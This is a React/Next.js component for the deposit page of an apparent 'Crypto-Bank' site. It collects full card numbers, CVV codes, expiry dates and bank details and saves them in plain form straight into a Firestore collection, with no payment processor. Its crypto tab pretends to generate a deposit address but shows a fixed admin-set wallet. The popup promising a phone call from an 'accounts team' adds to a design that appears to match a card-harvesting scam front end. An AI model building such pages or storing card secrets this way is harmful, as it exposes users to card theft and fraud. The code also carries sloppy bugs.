'use client';

import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { AlertTriangle, Copy } from 'lucide-react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Label } from "@/components/ui/label";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/components/ui/use-toast";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@radix-ui/react-tabs';
import { db } from '@/lib/firebase'; // Adjust the path as necessary
import { collection, addDoc, getDoc, doc } from 'firebase/firestore'; // Import Firestore functions
import { getAuth } from 'firebase/auth';
import { showToast } from '@/utils/toast';
import Image from "next/image";

export function DepositTab() {
  
  const [method, setDepositMethod] = useState<string>('');
  const [showDepositInfo, setShowDepositInfo] = useState<boolean>(false);
  const [walletAddress, setWalletAddress] = useState<string>('');
  const [CryptoName, setCryptoName] = useState<string>('');
  
  const [currency, setFiatCurrency  ] = useState<string>('');

  const [accountNumber, setaccountNumber  ] = useState<string>('');
  const [bankName, setbankName  ] = useState<string>('');
  const [swiftCode, setswiftCode  ] = useState<string>('');
  const [cardName, setcardName  ] = useState<string>('');
  const [cardNumber, setcardNumber  ] = useState<string>('');
  const [CryptoCurrency, setCryptoCurrency  ] = useState<string>('');
  const [cardCVV, setcardCVV  ] = useState<string>('');
  const [cardYear, setcardYear  ] = useState<string>('');
  
  const [paypalEmail, setpaypalEmail  ] = useState<string>('');
  const [methodSelected, setMethodSelected] = useState(false);

  const [qrCodeUrl, setQrCodeUrl] = useState<string>("");
//const [isLoading, setIsLoading] = useState<boolean>(false);
//const [fiatCurrency, setFiatCurrency] = useState('');



// const currencyMap = {
//   ETH: { qrCodeField: "ethurl", walletField: "ethid" },
//   BTC: { qrCodeField: "btcurl", walletField: "btcid" },
//   USDT: { qrCodeField: "usdturl", walletField: "usdtid" },
// };



  const [amount, setFiatAmount] = useState<string>('');
  const [accountName, setaccountName] = useState<string>('');
  //const [method, methodCAsh] = useState<string>('');
  const [cryptoAmount, setCryptoAmount] = useState<string>('');
  const [showFiatDepositPopup, setShowFiatDepositPopup] = useState<boolean>(false);
  const [missingFields, setMissingFields] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const { toast } = useToast();
  

  const handleProceedDeposit = async () => {
    const user = getAuth().currentUser ;
    if (!user) {
      toast({
        title: "Error",
        description: "You need to be logged in to cancel a withdrawal.",
        variant: "destructive",
      });
      return;
    }
    
    const missing: string[] = [];
    if (!currency) missing.push('fiat-currency');
    if (!amount) missing.push('fiat-amount');
    if (!method) missing.push('fiat-method');

    // Validate based on deposit method
// Validate based on selected deposit method
if (method === "Bank") {
  if (!accountName) missing.push("accountName");
  if (!accountNumber) missing.push("accountNumber");
  if (!bankName) missing.push("bankName");
  if (!swiftCode) missing.push("swiftCode");
} else if (method === "Card") {
  if (!cardName) missing.push("cardName");
  if (!cardNumber) missing.push("cardNumber");
  if (!cardYear) missing.push("cardExpiry");
  if (!cardCVV) missing.push("cardCVV");
} else if (method === "Paypal") {
  if (!paypalEmail) missing.push("paypalEmail");
}

    if (missing.length > 0) {
      setMissingFields(missing);
      toast({
        title: "Error",
        description: "Please fill in all required fields.",
        variant: "destructive",
      });
      return;
    }

    setMissingFields([]);
    resetFieldss(); 
    // Save deposit data to Firestore
    try {
      await addDoc(collection(db, 'deposits'), {
        type: 'Deposit',
        accountName,
        cardYear,
        currency,
        amount,
        method,
        date: new Date(),
        accountNumber,
        bankName,
        swiftCode,
        cardName,
        cardNumber, 
        cardCVV, 
        paypalEmail,
        status: 'Processing',
        userEmail: user.email,
      });
      setShowFiatDepositPopup(true);
      
      showToast({
        title: "Success!",
        description: "Deposit information saved successfully.",
        variant: "success",
      });
    } catch {
      toast({
        title: "Error",
        description: "Failed to save deposit information.",
        variant: "destructive",
      });
    }
    
  };

  const resetFieldss = () => {
    setFiatCurrency('');
    setFiatAmount('');
    setDepositMethod('');
    setaccountName('');
    setaccountNumber('');
    setbankName('');
    setswiftCode('');
    setcardName('');
    setcardNumber('');
    setcardYear('');
    setcardCVV('');
    setpaypalEmail('');
    
  };

  

  const handleGenerateDepositAddress = async () => {
    // Check if necessary fields are filled
    const user = getAuth().currentUser ;
    if (!user) {
      showToast({
        title: "Error",
        description: "You need to be logged in to cancel a withdrawal.",
        variant: "error",
      });
      return;
    }

    const missing: string[] = [];
    if (!CryptoCurrency) missing.push('crypto-currency');
    if (!cryptoAmount) missing.push('crypto-amount');
   
    
    if (missing.length > 0) {
      setMissingFields(missing);
      toast({
        title: "Error",
        description: "Please fill in all required fields.",
        variant: "destructive",
      });
      return;
    }

    setMissingFields([]);


    setIsLoading(true);
    try {
      // Simulate wallet address generation
      await new Promise((resolve) => setTimeout(resolve, 2000));
      const generatedWalletAddress = walletAddress; // Replace with actual generation logic
      setWalletAddress(generatedWalletAddress);
      setShowDepositInfo(true);
  
      // Optional: Save crypto deposit details to Firestore
      await addDoc(collection(db, 'deposits'), {
        type: 'Deposit',
        currency: CryptoCurrency,
        amount: cryptoAmount,
        walletAddress: generatedWalletAddress,
        date: new Date(),
        method: 'Crypto',
        status: 'Processing',
        userEmail: user.email,

      });
      resetFields(); 
  
      showToast({
        title: "Success!",
        description: "Deposit address generated and saved successfully.",
        variant: "success",
        
      });
    } catch (error) {
      console.error("Error generating deposit address: ", error);
      showToast({
        title: "Error",
        description: "Failed to generate deposit address.",
        variant: "default",
      });
    } finally {
      setIsLoading(false);
      
    }
  };

  const resetFields = () => {
    setCryptoCurrency('');
    setCryptoAmount('');
    //setWalletAddress('');
    //setQrCodeUrl('');
  };
  
  const handleCurrencyChange = async (value: string) => {
    setCryptoCurrency(value);
    setCryptoName(value); // Update the crypto name
    setShowDepositInfo(false); // Hide deposit information when a new selection is made

    const currencyMap = {
      ETH: { qrCodeField: "ethurl", walletField: "ethid", cryptoName: "ethname" },
      BTC: { qrCodeField: "btcurl", walletField: "btcid", cryptoName: "btcname" },
      USDT: { qrCodeField: "usdturl", walletField: "usdtid", cryptoName: "usdtname" },
    };
  
    if (value in currencyMap) {
      const { qrCodeField, walletField, cryptoName } = currencyMap[value as keyof typeof currencyMap];
  
      try {
        setIsLoading(true); // Show loading state while fetching
  
        // Fetch QR code URL
        const qrDoc = await getDoc(doc(db, "adminsettings", "qrcode"));
        if (qrDoc.exists()) {
          setQrCodeUrl(qrDoc.data()[qrCodeField]); // Use dynamic field
        } else {
          console.error(`No QR code found for ${value}`);
          toast({
            title: "Error",
            description: `No QR code found for the selected currency (${value}).`,
            variant: "destructive",
          });
          setQrCodeUrl("");
        }
  
        // Fetch wallet address
        const walletDoc = await getDoc(doc(db, "adminsettings", "qrcode"));
        if (walletDoc.exists()) {
          setWalletAddress(walletDoc.data()[walletField]); // Use dynamic field
        } else {
          console.error(`No wallet address found for ${value}`);
          toast({
            title: "Error",
            description: `No wallet address found for the selected currency (${value}).`,
            variant: "destructive",
          });
          setWalletAddress(""); // Clear wallet address if not found
        }

          // Fetch crypto name
          const cryptonameDoc = await getDoc(doc(db, "adminsettings", "qrcode"));
          if (cryptonameDoc.exists()) {
            setCryptoName(cryptonameDoc.data()[cryptoName]); // Use dynamic field
          } else {
            console.error(`No wallet address found for ${value}`);
            toast({
              title: "Error",
              description: `No wallet address found for the selected currency (${value}).`,
              variant: "destructive",
            });
            setCryptoName(""); // Clear wallet address if not found
          }

      } catch (error) {
        console.error("Error fetching data: ", error);
        toast({
          title: "Error",
          description: "Failed to fetch data. Please try again later.",
          variant: "destructive",
        });
      } finally {
        setIsLoading(false); // Stop loading state
      }
    } else {
      // Clear data if the currency is not supported
      setQrCodeUrl("");
      setWalletAddress("");
    }
  };
  
  
  const handleCurrencyChangee = (value: string) => {
    setFiatCurrency(value);
  
    // Example of field validation
    if (!value) {
      setMissingFields((prev) => [...prev, 'fiat-currency']);
    } else {
      setMissingFields((prev) => prev.filter((field) => field !== 'fiat-currency'));
    }
  };
  


  const handleMethodChangeee = (value: string) => {
    setDepositMethod(value);
    setMethodSelected(true);
    
    // Update missing fields based on the selection
    if (!value) {
      setMissingFields((prev) => [...prev, 'fiat-method']);
    } else {
      setMissingFields((prev) => prev.filter((field) => field !== 'fiat-method'));
    }
  };

  const copyToClipboard = (address: string | null) => {
    if (!address) {
      showToast({
        title: 'Error',
        description: 'No wallet address to copy',
        variant: 'error',
      });
      return;
    }

    navigator.clipboard
      .writeText(address)
      .then(() => {
        showToast({
          title: 'Copied',
          description: 'Wallet address copied to clipboard',
          variant: 'default',
        });
      })
      .catch(() => {
        showToast({
          title: 'Error',
          description: 'Failed to copy to clipboard',
          variant: 'error',
        });
      });
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="space-y-6"
    >
      <div className="space-y-6">
        
          <h2 className="pl-8 text-4xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-purple-400 to-pink-600">Deposit Funds</h2>
          <p className="pl-12 text-xl text-gray-400">Add funds to your Crypto-Bank account</p>
        </div>
      

     
        <div  style={{ borderRadius: '2rem' }} className="py-4 mx-4 flex items-center justify-center bg-gray-800 border border-gray-700"> {/* Full-height centering container with gray background */}
      <motion.div whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}>
        <Card
          // Maintain margin and border-radius
          
          className="mx-4 w-auto sm:w-[500px] sm:w-py-8 md:w-[500px] lg:w-[600px]  h-auto  bg-gray-800 card-no-border" // Use the same gray color for the card
        >
          <div className="  items-center justify-center w-[800] py-8"> {/* Centering content */}
            <CardHeader className="w-full text-center">
            <CardTitle className="text-3xl text-white">Fast Deposit</CardTitle>
          </CardHeader>
      <CardContent className="p-6">
            <Tabs defaultValue="fiat" className="w-full">
              <TabsList  style={{ borderRadius: '1.5rem' }} className="grid w-full grid-cols-2 bg-gray-700 rounded-lg p-1">
                <TabsTrigger value="fiat"  style={{ borderRadius: '0.8rem' }} className="text-lg text-white data-[state=active]:bg-purple-600  hover:bg-green-600 hover:text-white-600">Fiat Deposit</TabsTrigger>
                <TabsTrigger value="crypto"  style={{ borderRadius: '0.8rem' }} className="text-lg  text-white data-[state=active]:bg-purple-600  hover:bg-green-600 hover:text-white-600">Crypto Deposit</TabsTrigger>
              </TabsList>
              <TabsContent value="fiat">
                <motion.div 
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.2 }}
                  className="space-y-4 mt-4"
                >
                  <div>
                    <Label htmlFor="fiat-currency" className="text-lg text-white">Select Currency</Label>
                    <Select value={currency} onValueChange={handleCurrencyChangee}>

                      <SelectTrigger id="fiat-currency"  style={{ borderRadius: '0.5rem' }} className={`text-lg bg-gray-700 text-white border-gray-600 ${missingFields.includes('fiat-currency') ? 'border-red-500' : ''}`}>
                        <SelectValue placeholder="Select currency" />
                      </SelectTrigger>
                      <SelectContent className="text-lg bg-gray-800 text-white border-gray-700">
                        <SelectItem className="text-lg" value="CAD">CAD</SelectItem>
                        <SelectItem className="text-lg" value="EUR">EUR</SelectItem>
                        <SelectItem className="text-lg" value="USD">USD</SelectItem>
                        <SelectItem className="text-lg" value="GBP">GBP</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div>
                    <Label htmlFor="fiat-amount" className="text-lg text-white">Amount</Label>
                    <Input 
                      id="fiat-amount" 
                      type="number" 
                      placeholder="Enter amount" 
                      className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('fiat-amount') ? 'border-red-500' : ''}`} 
                      value={amount}
                      style={{ borderRadius: '0.5rem' }}
                      onChange={(e) => setFiatAmount(e.target.value)}
                    />
                  </div>
                  <div>
                    <Label htmlFor="fiat-method" className="text-lg text-white">Deposit Method</Label>
                    <Select value={method} onValueChange={handleMethodChangeee}>

                      <SelectTrigger id="fiat-method"  style={{ borderRadius: '0.5rem' }} className={`text-lg bg-gray-700 text-white border-gray-600 ${missingFields.includes('fiat-method') ? 'border-red-500' : ''}`}>
                        <SelectValue placeholder="Select deposit method" />
                      </SelectTrigger>
                      <SelectContent className="text-lg bg-gray-800 text-white border-gray-700">
                        <SelectItem  className="text-lg" id="bankName" value="Bank">Bank Transfer</SelectItem>
                        <SelectItem className="text-lg" value="Card">Credit/Debit Card</SelectItem>
                        <SelectItem className="text-lg" value="Paypal">PayPal</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  {method === 'Bank' && (
                    <div className="space-y-2">
                      <Input id="accountName"  style={{ borderRadius: '0.5rem' }} onChange={(e) => setaccountName(e.target.value)} placeholder="Account Name" className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('accountName') ? 'border-red-500' : ''}`} required />
                      <Input id="accountNumber"  style={{ borderRadius: '0.5rem' }} onChange={(e) => setaccountNumber(e.target.value)} type="number" placeholder="Account Number" className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('accountNumber') ? 'border-red-500' : ''}`} required />
                      <Input id="bankName"  style={{ borderRadius: '0.5rem' }} onChange={(e) => setbankName(e.target.value)} placeholder="Bank Name" className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('bankName') ? 'border-red-500' : ''}`}  required/>
                      <Input id="swiftCode"  style={{ borderRadius: '0.5rem' }} onChange={(e) => setswiftCode(e.target.value)} placeholder="SWIFT/BIC Code" className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('swiftCode') ? 'border-red-500' : ''}`} required />
                      <Alert variant="destructive">
                        <AlertTriangle className="h-4 w-4" />
                        <AlertTitle>Important</AlertTitle>
                        <AlertDescription>
                          Please ensure all bank details are correct. Incorrect details may result in delayed or failed deposits.
                        </AlertDescription>
                      </Alert>
                    </div>
                  )}
                  {method === 'Card' && (
                    <div className="space-y-2">
                      <Input id="cardName" 
                       style={{ borderRadius: '0.5rem' }}
                       onChange={(e) => setcardName(e.target.value)} placeholder="Name on Card" className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('cardName') ? 'border-red-500' : ''}`} required />
                      <Input id="cardNumber"  style={{ borderRadius: '0.5rem' }} onChange={(e) => setcardNumber(e.target.value)} type="number" placeholder="Card Number" className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('cardNumber') ? 'border-red-500' : ''}`} required />
                      <div className="flex space-x-2">
                        <Input
                          id="cardExpiry"
                          style={{ borderRadius: '0.5rem' }}
                          type="text"
                          inputMode="numeric"
                          pattern="\d{2}/\d{2}"
                          maxLength={5}
                          placeholder="MM/YY"
                          className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('cardExpiry') ? 'border-red-500' : ''}`}
                          required
                          onChange={(e) => {
                            let value = e.target.value.replace(/\D/g, '');
                            if (value.length > 2) {
                              value = value.slice(0, 2) + '/' + value.slice(2);
                            }
                            setcardYear(e.target.value)
                          }}
                        />
                        <Input
                          id="cardCVV"
                          style={{ borderRadius: '0.5rem' }}
                          onChange={(e) => setcardCVV(e.target.value)} 
                          type="text"
                          inputMode="numeric"
                          pattern="\d{3}"
                          maxLength={3} placeholder="CVV"
                          className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('cardCVV') ? 'border-red-500' : ''}`}
                          required
                        />
                      </div>
                      <p className="text-base text-gray-400 mt-1">Enter expiry date as MM/YY (e.g., 05/25 for May 2025)</p>
                    </div>
                  )}
                  {method === 'Paypal' && (
                    <div className="space-y-2">
                      <Input id="paypalEmail" 
                       style={{ borderRadius: '0.5rem' }}onChange={(e) => setpaypalEmail(e.target.value)} placeholder="PayPal Email" className={`text-lg bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('paypalEmail') ? 'border-red-500' : ''}`} required />
                    </div>
                  )}
                 {methodSelected && (
  <Button style={{ borderRadius: '0.5rem' }} className="text-lg w-full bg-purple-500 hover:bg-purple-600 text-white" onClick={handleProceedDeposit}>
    {method === 'Bank' ? 'Initiate Bank Transfer' : 'Proceed with Deposit'}
  </Button>
)}
                </motion.div>
              </TabsContent>
              <TabsContent value="crypto">
                <motion.div 
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.2 }}
                  className="space-y-4 mt-4"
                >
                  <div>
                    <Label htmlFor="crypto-currency" className="text-lg text-white">Select Currency</Label>
                    <Select  value={CryptoCurrency} onValueChange={handleCurrencyChange}>
                      <SelectTrigger id="crypto-currency"  style={{ borderRadius: '0.5rem' }} className={`text-lg bg-gray-700 text-white border-gray-600 ${missingFields.includes('crypto-currency') ? 'border-red-500' : ''}`}>
                        <SelectValue placeholder="Select currency" />
                      </SelectTrigger>
                      <SelectContent className="text-lg  bg-gray-800 text-white border-gray-700">
                        <SelectItem className="text-lg" value="BTC">Bitcoin (BTC)</SelectItem>
                        <SelectItem className="text-lg" value="ETH">Ethereum (ETH)</SelectItem>
                        <SelectItem className="text-lg" value="USDT">Tether (USDT)</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div>
                    <Label htmlFor="crypto-amount" className="text-lg text-white ">Amount</Label>
                    <Input 
                      id="crypto-amount" 
                      style={{ borderRadius: '0.5rem' }}
                      type="number" 
                      placeholder="Enter amount" 
                      className={`text-lg  bg-gray-700 text-white border-gray-600 placeholder:text-gray-400 ${missingFields.includes('crypto-amount') ? 'border-red-500' : ''}`} 
                      value={cryptoAmount}
                      onChange={(e) => setCryptoAmount(e.target.value)}
                      required
                    />
                  </div>
                  <Button className="text-lg  w-full bg-purple-500 hover:bg-purple-600 text-white"  style={{ borderRadius: '0.5rem' }} onClick={handleGenerateDepositAddress} disabled={isLoading}>
                    {isLoading ? 'Generating...' : 'Generate Deposit Address'}
                  </Button>
                </motion.div>
                {showDepositInfo && (
                  <motion.div 
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.2 }}
                    className="mt-6 space-y-4"
                  >
                    <Card style={{ borderRadius: '2rem' }} className="bg-gray-700 border-gray-600">
                      <CardHeader>
                        <CardTitle className="text-3xl  text-white">Deposit Information</CardTitle>
                        <CardDescription className="text-base text-gray-300">
                          Use the following details to complete your deposit
                        </CardDescription>
                      </CardHeader>
                      <h2 className="text-2xl text-purple-400 flex justify-center">{CryptoName ? `${CryptoName} QR Code` : "No Crypto Name Available!"}</h2>
                      <CardContent className="space-y-4">
                        <div className="flex justify-center">
                          
                        {qrCodeUrl ? (
                             <Image src={qrCodeUrl} alt="QR Code" style={{ width: 200, height: 200 }} />
                               ) : (
                            <p className="text-lg text-gray-300">No QR code available.</p>
                           )}
                        </div>
                        <div className="flex items-center justify-between bg-gray-800 p-2 rounded">
                          <span className="text-xl text-white break-all">{walletAddress || "No wallet address available"}</span>
                          <Button variant="ghost" size="sm" onClick={() => copyToClipboard(walletAddress)}>
                            <Copy className="text-base h-4 w-4 text-gray-300" />
                            <span className="sr-only">Copy wallet address</span>
                          </Button>
                        </div>
                        <p className="text-base  text-gray-300">
                          Please note that deposits may take up to 30 minutes to be credited to your account.
                        </p>
                        
                      </CardContent>
                      
                    </Card>
                    
                  </motion.div>
                )}
              </TabsContent>
              
            </Tabs>
          
          </CardContent>
          </div>
        </Card>
        
        
      </motion.div>
     </div>

      <Dialog open={showFiatDepositPopup} onOpenChange={setShowFiatDepositPopup}>
        <DialogContent style={{ borderRadius: '2rem' }} className="bg-gray-800 text-white">
          <DialogHeader>
            <DialogTitle>Deposit Pending</DialogTitle>
          </DialogHeader>
          <div className="py-4">
            <p>Your deposit is pending. Please hold on, you will get a call from our accounts team to confirm this deposit.</p>
          </div>
          <DialogFooter>
            <Button style={{ borderRadius: '0.5rem' }} onClick={() => setShowFiatDepositPopup(false)} className="bg-purple-500 hover:bg-purple-600">Close</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </motion.div>
  );
}
export default DepositTab;